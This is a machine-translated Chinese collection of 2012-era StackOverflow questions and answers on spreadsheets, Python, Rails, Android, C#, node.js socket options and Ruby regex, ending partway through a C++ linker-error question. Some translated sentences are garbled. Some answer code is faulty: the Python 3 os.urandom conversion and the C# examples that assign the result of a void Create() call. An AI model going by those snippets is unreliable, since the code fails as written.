# StackOverflow 问答 13217000-13217999

# xpath - 导入 XML 谷歌电子表格无法正常工作

> ID：13217001
> 
> 赞同：0
> 
> 时间：2012-11-04T07:52:43.337
> 
> 标签：xpath, google-sheets, google-spreadsheet-api

找到我试图从 booking.com 中提取数据的 Google 电子表格的附加链接。

我在列中检索了酒店名称。它成功检索了酒店名称。但不适用于每一列。输出是这样的。

即使我正确引用了公式。但它自动变成了这样..=CONTINUE(E1, 2, 1)

红色突出显示的单元格有问题。看这里。

请找到以下链接供您参考。提前致谢。

[https://docs.google.com/spreadsheet/ccc?key=0AtjX3Ttg50IydHJzR1FMSkJyY0U1bHBSeWtrMDRSZ1E](https://docs.google.com/spreadsheet/ccc?key=0AtjX3Ttg50IydHJzR1FMSkJyY0U1bHBSeWtrMDRSZ1E)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T21:52:46.493

E1中的公式：

`=ImportXML(D1,"//div[@id = 'wrap-hotelpage-top']/h1[@class='item']/span")`

正在返回一个 2 x 2 数组。要仅返回左上角单元格并避免填充 CONTINUE 函数（以便您可以成功填写），请使用

`=INDEX(ImportXML(D1,"//div[@id = 'wrap-hotelpage-top']/h1[@class='item']/span");1;1)`

# cookies - 在 cookie 中加密字符串的常见做法是什么？

> ID：13217002
> 
> 赞同：-2
> 
> 时间：2012-11-04T07:52:44.467
> 
> 标签：cookies, encryption

我不知道该选择哪种加密算法，哈希函数无法生成以下加密字符串，有帮助吗？

```
NzQyOWRmMGY0MGVjNDc5YjQyYzcyYTQ0MmRmYTliN2ExNTQwZjI3YnsidXNlcm5hbWUiOiJKaV
9MdW8iLCJfY3JlYXRlZCI6IjIwMTIxMTAyMTE0MjIxIn0= 
```

更新：我只想在 cookie 中加密一些东西，抱歉忘记了上下文

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T00:43:45.510

注意：加密和编码是两件不同的事情......

您发布的是 base64 编码的字符串，这意味着，一旦将其放入 base64 解码器，您将获得原始字符串......不适合保密

如果您只想这样，[这里有一些内容供您阅读](http://en.wikipedia.org/wiki/Base64)...

如果你想存储一些秘密，你应该考虑使用像 AES 这样的密码（如果你愿意，你可以将二进制密文存储在 base64 编码中......）

# python - Python 3 包模块与标准模块冲突

> ID：13217005
> 
> 赞同：3
> 
> 时间：2012-11-04T07:53:28.413
> 
> 标签：python, python-3.x, python-2.x

我最近决定升级到 python 3，并开始转换我的一些脚本。我在使用名为 - 在 python 2 中的模块的脚本中遇到了一个问题`io`，这很好，但是在 python 3 中，`io`它是文件的标准模块。我发现[了这个关于同一类型问题的老](https://stackoverflow.com/questions/1224741/python-import-with-name-conflicts)问题，但这似乎与python 2有关。我有相反的问题 - 给定两个文件，`main.py`在`io.py`顶级包`import io`中，`main.py`将导入标准`io`模块，而不是本地模块一。`from __future__ import absolute_imports`没有帮助，并且`from . import io`并且相关尝试按预期失败（我从来没有理解过 - python 真的不知道顶级包在哪里？）。重命名显然是一种解决方案，但如果可能的话，我想避免它。是否有一些解决模块名称冲突的python 3标准方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:12:44.383

这是我的答案：-

我的目录结构：-

```
calvin$ tree /Users/calvin/work/learn3/
/Users/calvin/work/learn3/
└── myspecialpackage
    ├── __init__.py
    ├── __init__.pyc
    ├── io.py
    ├── io.pyc
    └── main.py 
```

`__init__.py`是一个空文件。

`io.py`是您的自定义模块，它与 python3 的 io 模块冲突。

`main.py`包含这一堆示例代码：-

```
import os
import sys

# These two lines are not needed you are installing the `myspecialpackage` via pip/pypi and as setup.py script places "myspecialpackage" and all its contents in your python site-packages, which is already in PYTHONPATH.
our_package_root = os.path.dirname(os.path.realpath(__file__))
sys.path.append(our_package_root)

from myspecialpackage import io
print(io.__file__) 
```

导入的`io`模块将是您`io.py`的模块，而不是 python3 的模块。

作为奖励，使用这种方法将允许我们拥有您的自定义模块`io.py`以及 python3 的`io`模块（如果您希望拥有您的蛋糕并吃掉它;-)）。您可以像这样解除命名空间的使用冲突`io`：-

```
from myspecialpackage import io as my_special_io
print(my_special_io.__file__)

import io
print(io.__file__) 
```

然后跑步`main.py`会给你： -

```
In [3]: run myspecialpackage/main.py
/Users/calvin/work/learn3/myspecialpackage
./myspecialpackage/io.py
/Users/calvin/.virtualenvs/learn3/bin/../lib/python3.3/io.py 
```

记下我上面关于

```
our_package_root = os.path.dirname(os.path.realpath(__file__))
sys.path.append(our_package_root) 
```

# ruby-on-rails - 将 URL 参数传递给下拉菜单

> ID：13217015
> 
> 赞同：0
> 
> 时间：2012-11-04T07:55:20.690
> 
> 标签：ruby-on-rails, forms, url, simple-form

我有一个简单的表格：

```
 <%= f.input :type, :required => true, :collection => ["Nonprofit","School","Company"], :hint => "Note: nonprofits will need to provide proof of nonprofit status", :input_html => { :value => params['type'] } %>
 <%= f.input :name, :label => "Organization" %>
 <%= f.input :first_name  %>
 <%= f.input :last_name %>
 <%= f.input :email %> 
```

[用户通过http://www.website.com/org/signup?type=Company](http://www.website.com/org/signup?type=Company)之类的 URL 访问此页面

我可以使用这种格式在名称或电子邮件等字段中输入值，但不知道如何将参数传递给下拉列表。

我已经尝试了一些事情，包括将 :value 更改为 :selected 或 :option 但似乎没有任何效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T07:59:38.300

好吧，想通了！在这里张贴以供将来使用。

```
<%= f.input :type, :required => true, :collection => ["Nonprofit","School","Company"], :hint => "Note: nonprofits will need to provide proof of nonprofit status", :selected => params['type'] %> 
```

诀窍是删除 :input_html 部分并使用

```
:selected = > params['type'] 
```

希望对将来的人有所帮助！

# python - Python 3 os.urandom

> ID：13217016
> 
> 赞同：11
> 
> 时间：2012-11-04T07:55:21.970
> 
> 标签：python, random, python-3.x

在哪里可以找到完整的教程或文档`os.urandom`？我需要获得一个随机 int 来从 80 个字符的字符串中选择一个字符。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-04T07:59:44.977

如果你只需要一个随机整数，你可以使用[`random.randint(a, b)`random 模块](http://docs.python.org/3/library/random.html#random.randint)。

如果您需要它用于加密目的，请使用`random.SystemRandom().randint(a, b)`，它使用`os.urandom()`.

### [例子](http://ideone.com/Nqgq0D)

```
import random

r = random.SystemRandom()
s = "some string"
print(r.choice(s)) # print random character from the string
print(s[r.randrange(len(s))]) # same 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-03-07T12:53:21.580

可能不完全是主题，但我想帮助那些从搜索引擎来到这里的人。要转换`os.urandom`为整数，我正在使用它：

```
 import os

 rand = int(int(str(os.urandom(4), encoding="UTF-8")).encode('hex'), 16)
 # You can then 'cycle' it against the length.
 rand_char = chars_list[rand % 80] # or maybe '% len(chars_list)' 
```

**注意：**这里的索引范围最大为 4 字节整数。如果您想要更多，请将 更改`4`为更大的值。

这个想法来自这里：[https ://pythonadventures.wordpress.com/2013/10/04/generate-a-192-bit-random-number/](https://pythonadventures.wordpress.com/2013/10/04/generate-a-192-bit-random-number/)

# android - Eclipse 不创建位置（字符串）对象。为什么？

> ID：13217020
> 
> 赞同：3
> 
> 时间：2012-11-04T07:55:43.920
> 
> 标签：android, object, location

我想通过谷歌地图计算两点之间的距离。我搜索了，我认为我使用了 Location 对象，但是当我写这个时：

```
import java.io.IOException;
import java.lang.Runnable;
import java.util.List;
import java.util.Locale;
import java.lang.Object;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Point;
import android.location.Address;
import android.location.Geocoder;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.view.View.OnKeyListener;
import android.view.KeyEvent;
import android.location.Location;

import com.google.android.maps.GeoPoint;
import com.google.android.maps.GeoPoint;
import com.google.android.maps.MapActivity;
import com.google.android.maps.MapController;
import com.google.android.maps.MapView;
import com.google.android.maps.MyLocationOverlay; 
```

Eclipse 编写 android.location.Location；与同一文件中定义的类型冲突。当我创建一个位置对象时，Eclipse 写道构造函数 Location(string) 是未定义的。

```
Location location=new Location(""); 
```

问题是什么？我应该怎么办？干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:02:07.407

冲突可能是因为您可能已经定义了自己的 Location 类或引用了由项目的其他部分（可能是外部库）定义的另一个 Location 类。

使用完全限定名称解决这些引用问题。例如，如果您有自己的 Location 类，则将其称为`com.mysampleapp.Location`而不是仅`Location`.

构造函数未被识别，因为它指的是您项目中的另一个 Location 类，而不是 Google 提供的类，即`android.location.Location`。

一旦您解决了我刚刚讨论的参考问题，这将消失。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-07T18:50:58.120

我尝试导入时遇到了类似的问题

```
import android.location.Location; 
```

在名为 Location.java 的文件中。

重命名文件有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T08:15:43.813

对于这种情况，谷歌已经为你想要的东西提供了很好的服务。在这种情况下使用[Google Direction API](https://developers.google.com/maps/documentation/directions/)。您也可以使用 Google Map API，但我认为 Direction API 会更方便您的要求。

例如，如果您想计算从安大略省多伦多到魁北克蒙特利尔之间的距离。你应该像下面这样查询：

[http://maps.googleapis.com/maps/api/directions/json?origin=Toronto&destination=Montreal&sensor=false](http://maps.googleapis.com/maps/api/directions/json?origin=Toronto&destination=Montreal&sensor=false)

上面的查询为您提供 JSON 响应。当您将此 URL 放入浏览器时，您可以看到两个位置之间的距离，例如：

```
"legs" : [
            {
               "distance" : {
                  "text" : "542 km",
                  "value" : 542397 
```

您可以使用 HttpClient 类在 android 中使用此查询，如下所示：

```
 HttpClient httpclient = new DefaultHttpClient();
             HttpPost httppost = new HttpPost(this.URL);
             httppost.setEntity(new UrlEncodedFormEntity(this.postParameters));
             HttpResponse response = httpclient.execute(httppost);
             HttpEntity entity = response.getEntity();
             is = entity.getContent(); 
```

并且可以得到 JSON 响应。您可以根据您的要求更改 `origin=''&destination=''。

希望对您有所帮助。如果您觉得我的回答对您有帮助，请接受并投票。享受编码...

# iphone - 删除 2 个 UIPickerView 组件之间的分隔符

> ID：13217022
> 
> 赞同：0
> 
> 时间：2012-11-04T07:56:54.060
> 
> 标签：iphone, objective-c, ios, uipickerview

所以我试图在我的应用程序中做一些事情，但没有任何成功。我有这个`UIPickerView`他有3个组件。第一个组件是 0-1000 之间的数字，第二个是度量，第三个应该是一个单词，但它必须是不可滚动的。它应该看起来像这样：

![uipickerview 屏幕截图](../Images/25287dec29aec69382681291e1f846e6.png)

谁能告诉我如何删除第二个和第三个组件之间的分隔符，以及如何添加这样一个触摸时不会移动的文本？

非常感谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:17:34.823

你可以作弊:)

制作一个两行而不是三行的选择器。

然后将您的静态文本添加为`UILabel`​​选择器的上方 - 它看起来像是选择器的一部分，但不会移动。

# java - 无法使用 DigitalPersona Sdk java 版本反序列化功能集

> ID：13217029
> 
> 赞同：0
> 
> 时间：2012-11-04T07:57:52.997
> 
> 标签：java, netbeans, comparison, fingerprint

我正在尝试使用 digitalpersona one touch for windows sdk java edition 创建一个肥皂网络服务方法来匹配指纹。我从客户端的小程序中捕获功能集，并将其与服务器端的模板进行比较。但我需要反序列化它并再次创建功能集，以便我可以将它与模板进行比较。

我不知道如何重新创建功能集以便我可以将其用于验证：

```
//This is for template retrieval: (no problem here) 

       String dbTemplate = result.getString("template");
            byte[] byteArray = new byte[1];
            byteArray = hexStringToByteArray(dbTemplate);
            DPFPTemplate template = DPFPGlobal.getTemplateFactory().createTemplate();
            template.deserialize(byteArray);

            byte[] fsArray = new byte[1];
            fsArray = hexStringToByteArray(ftSet);

      //the problem is here, I've already converted it back into bytearray[] but i need to deserialize it and create the feature set again.

             featureSet.deserialise(fsArray);
            DPFPFeatureSet features = extractFeatures(sample, DPFPDataPurpose.DATA_PURPOSE_VERIFICATION);

//This is for matching features and template
            DPFPVerification matcher = DPFPGlobal.getVerificationFactory().createVerification();
            DPFPVerificationResult result1 = matcher.verify(features, template);
            if (result1.isVerified()) {

                return "The fingerprint was VERIFIED.";

            } else {
                return "The fingerprint was NOT VERIFIED.";

            } 
```

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T19:08:46.640

您可以在这里做的最好的事情是不要将字节数组转换为字符串。如果将其保存在数据库中，则可以自动将其保存为字节数组（因为 blob 可以接受字节数组）。

你可以像这样插入它（只是一个例子）

```
PreparedStatement st=con.prepareStatement("INSERT INTO EMPLOYEE(employee_id,template)"+"values(?,?)");
st.setInt(1,23);
st.setBytes(2, enroller.getTemplate().serialize());

Statement st = con.createStatement();
ResultSet rec = st.executeQuery("SELECT * FROM EMPLOYEE WHERE EMPLOYEE_ID=3"); 
```

然后在访问模板时，对其进行反序列化（只需按照 sdk，我认为它在第 37 页左右）[Onetouch java sdk](http://www.digitalpersona.com/uploadedFiles/Support/Reference_Material/Guides/SDK_Guides/One-Touch-for-Windows-SDK-Java-Developer-Guide.pdf) ==== 链接

下面将提供一个示例。

```
while(rec.next()){
    blob = rec.getBlob("template");
    int blobLength = (int)blob.length();  
    blobAsBytes = blob.getBytes(1, blobLength);
}
templater.deserialize(blobAsBytes);         
verificator.setFARRequested(DPFPVerification.MEDIUM_SECURITY_FAR);
DPFPVerificationResult result = verificator.verify(fs, templater);
if (result.isVerified())
    System.out.print("The fingerprint was VERIFIED."); 
```

# visual-studio - 如何强制 Visual Studio 在构建期间复制一些文件

> ID：13217030
> 
> 赞同：2
> 
> 时间：2012-11-04T07:57:54.510
> 
> 标签：visual-studio, visual-studio-2008, visual-c++

我正在构建一个在 Visual Studio 2008 中用 Qt 编写的应用程序。一切正常，我可以运行输出，但可执行文件取决于要在运行时加载的其他一些文件。每次更改这些文件时，都需要将这些文件与 .EXE 文件一起复制，因为我需要在 IDE 之外运行已发布的输出。

在项目构建期间，除了 .EXE 文件之外，是否可以在输出目录中复制一些文件/文件夹？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:09:17.847

这是如何完成的：

1.  转到您的解决方案资源管理器并打开项目属性
2.  选择“构建事件”选项卡
3.  输入构建后命令。您还可以使用宏（不确定 VS2008。VS2010 已经支持它们）

这是构建事件的好资源，您可以从中继续：

[http://msdn.microsoft.com/en-us/library/42x5kfw4(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/42x5kfw4(v=vs.80).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-05T20:46:03.000

如果使用 Visual Studio 右键单击​​要复制到输出文件夹的文件，请选择属性。在高级部分，第二个选项是：复制到输出目录。默认情况下，这是“不要复制”。根据需要选择其他选项，例如“始终复制”或“如果更新则复制”。这些属性将保存到您的 .csproj 文件中。

# c# - ?: 运算符返回 void

> ID：13217032
> 
> 赞同：0
> 
> 时间：2012-11-04T07:58:25.023
> 
> 标签：c#, .net, operators

我想使用`?:`运算符而不是`if else`

例如

```
var directory = new DirectoryInfo(path);
if (!directory.Exist())
{
    directory.Create();
}
else 
{
    // do nothing
} 
```

我试着这样使用`?:`：

```
var directory = new DirectoryInfo(path);
!directory.Exist() ? directory.Create() : void; 
```

但它说“无效的表达术语`void`”，`null`也不起作用。

谁能告诉我一个解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:00:11.920

在您的情况下，只有`if`条件更适合。

只是为了您的理解，三元运算符（`?:`）需要在右侧产生一个值，并且还需要在左侧有一个变量来分配结果值，例如：

```
 x =  (y== null) ? 0: 1; 
```

这意味着分配`0`给`x`，`y is null`否则分配`1`。

因此，在您的示例/场景中，您可以编写类似这样的内容以导致目录创建状态如下：

```
 var newDirectoryCreated = (!directory.Exist()) ? directory.Create() : false; 
```

这样，如果创建了新目录，则将`newDirectoryCreated`分配else 。`true``false`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T08:01:41.327

三元运算符**不是为了替换而设计的，`if/else`**它们是为了简化赋值和声明。它应该能够将语句的结果分配给变量或函数之类的东西。主要用于作业或阅读。

就像是

```
var status = !directory.Exist() ? directory.Create() : false; 
```

正确的解决方案是坚持原生`if`条件。以下内容就足够了：

```
var directory = new DirectoryInfo(path);
if (!directory.Exist())
{
    directory.Create();
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-04T08:04:33.507

如果你只是为了简洁，你可以试试这个：

```
if (!directory.Exist())
    directory.Create(); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-04T07:59:41.977

只需保留该`if`声明并删除该`else`分类，因为您没有在其中做任何事情。

您正在尝试使用[三元运算符](http://msdn.microsoft.com/en-US/library/ty67wk28.aspx)，根据定义，它*必须*返回一个值。

从文档中：

> 条件运算符 (?:) 根据布尔表达式的值返回两个值之一。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-04T08:05:21.090

运营商的`?:`行为大致是这样的：

对于`x ? y : z`，`y`如果`x`为真则返回，否则返回`z`。

由此我们可以推断出几件事：

*   两者都`y`必须`z`返回*一些东西*（如果它们中的任何一个评估为 ，它将不起作用`void`），并且
*   `y`并且`z`必须评估为*相同*的类型。（想象一下你有这样的东西：`var r = x ? y : z;`. 哪个类型是 r？它是`y`or的类型`z`吗？我们不知道它们中的哪一个会被返回，但我们必须在编译时选择一个类型。所以它们必须返回同一类型。

在您的情况下，两者都评估为`void`，这是行不通的。（如果您将最后一部分更改为`null`，如您所说，您已经尝试过，那么它们会评估为不同的类型，其中一种是无效的，这违反*了两个*规则）

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-04T08:00:43.283

[条件运算符](http://msdn.microsoft.com/en-us/library/ty67wk28%28v=vs.110%29.aspx)(?:) 必须根据布尔表达式的值返回两个值之一。所以你可以坚持使用`if`从句，它仍然很容易理解而不是条件运算符：

```
var directory = new DirectoryInfo(path);
if (!directory.Exist()) directory.Create(); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-04T12:29:09.427

?: 运算符是 if-then-else 结构的扩展。

扩展在 then-block 和 else-block 中。如果 then-block 和 else-block 为 if-then-else 构造返回 void，它必须为 ?: 运算符返回一个类型。?: 运算符中类型的另一个约束是这两种类型必须相同。由于编译器将使用自动转换来使这两种类型相同，这一约束被稍微软化了。

使用 ?: 运算符的代码通常更短，但也更难阅读。这是用 ?: 运算符替换 if-then-else 结构时要考虑的一点。除非您的 then-block 和 else-block 是一个衬垫，否则很少值得用 ?: 运算符替换它。

if-then 结构是 if-then-else 结构的受限版本（反之亦然，if-then-else 结构是 if-then 结构的扩展）。由于 if-then 结构只有一个代码块，即 then-block，因此无法用 ?: 运算符替换 if-then 结构。您首先必须使用空的 else 块来扩展 if-then 结构。

例子：

```
// initialising an integer with an if-then construct.
int x = 0;
if (some_condition)
{
    x = 1;
} 
```

可以把它想象成 then 块返回一个整数。不能使用 ?: 运算符。

```
// initialising an integer with an if-then-else construct.
int y;
if (some_condition)
{
    y = 1;
}
else
{
    y = 0;
} 
```

将 if-then 构造扩展为 if-then-else 构造，并将 then-block 和 else-block 视为返回一个整数，以表示类型一致 ;-) 彼此匹配。在这种情况下可以使用 ?: 运算符。

```
// initialising an integer with a ?: operator.
int z = (some_condition) ? 1 : 0; 
```

关于您的代码：

```
var directory = new DirectoryInfo(path);
if (!directory.Exist())
{
    directory.Create();
} 
```

在这种情况下，我看不到使 then-block 返回值的明智方法。这使得使用 ?: 运算符变得不可能或非常复杂，因此代码丑陋。我的建议是，在这种情况下坚持使用 if-then 构造。

# node.js - node.js下如何setsockopt？

> ID：13217049
> 
> 赞同：4
> 
> 时间：2012-11-04T08:01:43.137
> 
> 标签：node.js, sockets

node.js 中是否有类似 setsockopt/getsockopt 的套接字选项操作功能？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2016-08-26T19:13:30.820

我正在扩展`socketpair`which show 留下的评论`getsockopt`。您可以通过使用`ffi`和来完成此操作`ref`。我已经重新格式化它以使其易于操作。

我编辑了我的评论，因为我必须进行一些更改才能使代码在 Linux 和 Win32 上都可以工作。我必须为 Windows 创建一个[节点库](https://github.com/clshortfuse/node-getsockethandleaddress)来获取套接字句柄并将其传递给`setsockopt`. 请注意，Linux 和 Windows 可能有不同的套接字选项值

编辑：这是我正在使用的一段清理后的生产代码：

```
var net = require("net");
var ffi = require("ffi");
var ref = require("ref");
var getSocketHandleAddress;

var SOL_SOCKET = 0x1;
var SO_OOBINLINE = 0xA;
var _setsockopt;

if (process.platform == "win32") {
  SOL_SOCKET = 0xffff;
  SO_OOBINLINE = 0x0100;
}

var setSocketOption = function (handle, level, option, value) {
  if (!_setsockopt) {
    var library;
    var paramTypes;
    if (process.platform === "win32") {
      library = "ws2_32.dll";
      paramTypes = [
        ref.types.int,
        ref.types.int,
        ref.types.int,
        ref.refType(ref.types.void),
        ref.types.int
      ];
    } else {
      paramTypes = [
        ref.types.int,
        ref.types.int,
        ref.types.int,
        ref.refType(ref.types.void),
        ref.refType(ref.types.int)
      ];
    }
    var lib = new ffi.DynamicLibrary(library);
    _setsockopt = ffi.ForeignFunction(
      lib.get("setsockopt"),
      ref.types.int,
      paramTypes);
  }
  var refType;
  var length;
  if (typeof value === "boolean") {
    refType = ref.types.bool;
  } else {
    refType = ref.types.int;
  }
  if (process.platform !== "win32") {
    return _setsockopt(
      handle.fd, 
      level, 
      option, 
      ref.alloc(refType, value), 
      ref.alloc(ref.types.int, refType.size)
    );
  }
  if (!getSocketHandleAddress) {
    getSocketHandleAddress = require("getsockethandleaddress");
  }
  return _setsockopt(
    getSocketHandleAddress.getAddress(handle),
    level,
    option,
    ref.alloc(refType, value), 
    refType.size
  );

};

var tcpserver = net.createServer(function (socket) {
  var ret = setSocketOption(socket._handle, SOL_SOCKET, SO_OOBINLINE, true);
  if (ret !== 0) {
    console.error("OOB Inline socket option failed: " + ret);
  }
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-04-14T19:07:56.200

这是我的getsockopt：

```
var ffi = require('ffi');
var net = require('net');
var StructType = require('ref-struct');
var ref = require('ref');

var current = ffi.Library(null, {
  'getsockopt': [ 'int', [ 'int', 'int', 'int', 'pointer', 'pointer']],
  'ntohs': ['uint16', ['uint16']],
//    const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);

});

var SOL_IP = 0;
var SO_ORIGINAL_DST = 80;
var AF_INET = 2;

var sockaddr_in = StructType([
    ['int16', 'sin_family'],
    ['uint16', 'sin_port'],
    ['uint32', 'sin_addr'],
    ['uint32', 'trash1'],
    ['uint32', 'trash2'],
]);

function get_original_dst(client) {
    var dst = new sockaddr_in;
    var dstlen = ref.alloc(ref.types.int, sockaddr_in.size);
    var r = current.getsockopt(client._handle.fd, SOL_IP, SO_ORIGINAL_DST, dst.ref(), dstlen);
    if (r === -1)
        throw new Error("getsockopt(SO_ORIGINAL_DST) error");
    if (dst.sin_family !== AF_INET)
        throw new Error("getsockopt(SO_ORIGINAL_DST) returns unknown family: " + dst.sin_family );

    // TODO: inet_ntop. inet_ntoa is _UNSAFE_
    var ipaddr = dst.ref(); ipaddr = ipaddr[4] + "." + ipaddr[5] + "." + ipaddr[6] + "." + ipaddr[7];

    return [ipaddr, current.ntohs(dst.sin_port)];
}

module.exports.get_original_dst = get_original_dst; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-06-12T15:47:17.503

有点晚了，但这是 npm 上的一个 pacakge [https://www.npmjs.com/package/net-keepalive](https://www.npmjs.com/package/net-keepalive)

> 提供对 TCP_KEEPIDLE、TCP_KEEPINTVL、TCP_KEEPCNT 等套接字选项的高级访问

```
var Net = require('net')
  , NetKeepAlive = require('net-keepalive')
;

// Create a TCP Server
var srv = Net.createServer(function(s){>
  console.log('Connected %j', s.address())
  // Doesn't matter what it does
  s.pipe(s)
});

// Start on some port
srv.listen(1337, function(){
  console.log('Listening on %j', srv.address())
});

// Connect to that server
var s = Net.createConnection({port:1337}, function(){
  console.log('Connected to %j', s.address())

  //IMPORTANT: KeepAlive must be enabled for this to work
  s.setKeepAlive(true, 1000)

  // Set TCP_KEEPINTVL for this specific socket
  NetKeepAlive.setKeepAliveInterval(s, 1000)

  // and TCP_KEEPCNT
  NetKeepAlive.setKeepAliveProbes(s, 1)
}); 
```

# asp.net-mvc - 将博客作为一项功能向我的 ASP.NET MVC 站点的用户公开的工具

> ID：13217055
> 
> 赞同：1
> 
> 时间：2012-11-04T08:03:02.013
> 
> 标签：asp.net-mvc, frameworks, blogs, web-frameworks

我正在构建一个带有 facebook 集成登录的 ASP.NET MVC 网站。作为本网站功能的一部分，我想向用户展示一个博客选项。登录用户应该能够发布新博客并管理他们之前的博客。是否有可以包含/集成到当前站点的库或项目？

垃圾邮件拦截、可选择的自定义博客模板等功能将是一个不错的选择。

我已经研究了以下内容：

[Orchard：](http://www.orchardproject.net/)对于管理他/她博客的管理员来说，这似乎更像是一个 CMS，而不是向我的网站用户公开博客作为一项功能的选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-27T23:01:36.797

你检查过umbraco吗？

它是免费的、完全模板化的并且非常灵活。内容以节点结构发布，媒体项目也是如此。您可以授予节点权限，创建只能查看并能够编辑自己的节点/媒体文件夹的用户

# python - Python 接受 CPython 函数中的关键字参数？

> ID：13217056
> 
> 赞同：7
> 
> 时间：2012-11-04T08:03:04.417
> 
> 标签：python, keyword-argument, python-3.3

我使用 python3.3 并发现它在它的*一些*CPython 函数中接受关键字参数：

```
>>> "I like python!".split(maxsplit=1)
['I', 'like python!'] 
```

但其他一些函数**不**接受关键字参数：

```
>>> sum([1,2,3,4], start = 10)
Traceback (most recent call last):
  File "<pyshell#58>", line 1, in <module>
    sum([1,2,3,4], start = 10)
TypeError: sum() takes no keyword arguments 
```

我的问题是：这些功能之间有什么区别？CPython 中哪些函数接受关键字参数，哪些函数不接受？当然——为什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-04T08:11:59.077

使用[PyArg_ParseTuple()](http://docs.python.org/dev/c-api/arg.html#PyArg_ParseTuple)解析其参数的 CPython 函数不支持关键字参数（主要是因为`PyArg_ParseTuple()`仅支持位置参数，例如简单序列）。

这在`CPython implementation details` [这里](http://docs.python.org/dev/reference/expressions.html#calls)解释：

> **CPython 实现细节：**实现可以提供其位置参数没有名称的内置函数，即使它们是出于文档目的而“命名”的，因此不能由关键字提供。`PyArg_ParseTuple()`在 CPython 中，在 C 中实现的用于解析其参数的函数就是这种情况。

# ruby-on-rails - gsub 使用 / 或 "有什么区别？

> ID：13217058
> 
> 赞同：0
> 
> 时间：2012-11-04T08:03:53.960
> 
> 标签：ruby-on-rails, ruby

我正在尝试使用 gsub 替换`"?"`和`"."`空白空间。

`gsub(".", "")`我意识到这是和之间的区别`gsub(/./, "")`，但我不知道它是什么。有人可以解释吗？

此外，`gsub("?","")`似乎工作，并`gsub(/?/,"")`没有工作。我们怎样才能`gsub(/?/,"")`工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:08:01.467

`gsub("?", "")`匹配文字`?`，而`gsub(/?/, "")`使用[正则表达式](http://www.regular-expressions.info/tutorial.html)来查找匹配项。在正则表达式中，这`?`意味着前一个字符可以出现 0 次或 1 次。为了匹配文字`?`，您必须将其转义：

```
gsub(/\?/, "") 
```

另请参阅有关[gsub的 ruby​​ 文档](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-gsub)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T08:26:50.630

最后，正如上面提到的，`/reg/`当`"str"`只表示一个字符串时，它表示正则表达式。您的目标是从字符串中删除`?`和。`.`正则表达式将完成这项工作：

```
gsub(/[?.]/, '') 
```

[您可以在此处](http://www.ruby-doc.org/core-1.9.3/Regexp.html)阅读有关 ruby​​ regexp的更多信息。在我的示例`/[abc]/`中将匹配单个字符`a`or`b`或`c`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T08:07:03.930

前者是从字面上找到“？” 字符并替换它们，而后者是查找给定字符的 0 或 1 的出现。`?`对于正则表达式具有特殊含义，您可以使用`/`.

# c++ - C++ 头文件和链接器错误

> ID：13217067
> 
> 赞同：0
> 
> 时间：2012-11-04T08:05:46.660
> 
> 标签：c++, compiler-errors, g++

编译代码时出现奇怪的错误。我猜头文件没有被正确链接，因为那些出错的变量中的每一个都已在我正确#include的'variables.h'中指定。奇怪的是，如果我在 main.cpp 中注释掉使用变量的区域，则会在另一个文件 readfile.cpp 中弹出相同变量的其他一系列错误。下面是错误输出，以及我的 main.cpp 和 variables.h 代码。有任何想法吗？

```
g++ -c main.cpp 
g++ -c readfile.cpp 
g++ -c Objects.cpp 
g++ -o raytracer main.o readfile.o Objects.o
Undefined symbols for architecture x86_64:
  "_depth", referenced from:
      init()    in main.o
      readFile(char const*)in readfile.o
  "_diffuse", referenced from:
      readFile(char const*)in readfile.o
  "_emission", referenced from:
      readFile(char const*)in readfile.o
  "_filename", referenced from:
      init()    in main.o
  "_fov", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_height", referenced from:
      init()    in main.o
      readFile(char const*)in readfile.o
  "_lookatx", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_lookaty", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_lookatz", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_lookfromx", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_lookfromy", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_lookfromz", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_maxvertnorms", referenced from:
      init()    in main.o
      readFile(char const*)in readfile.o
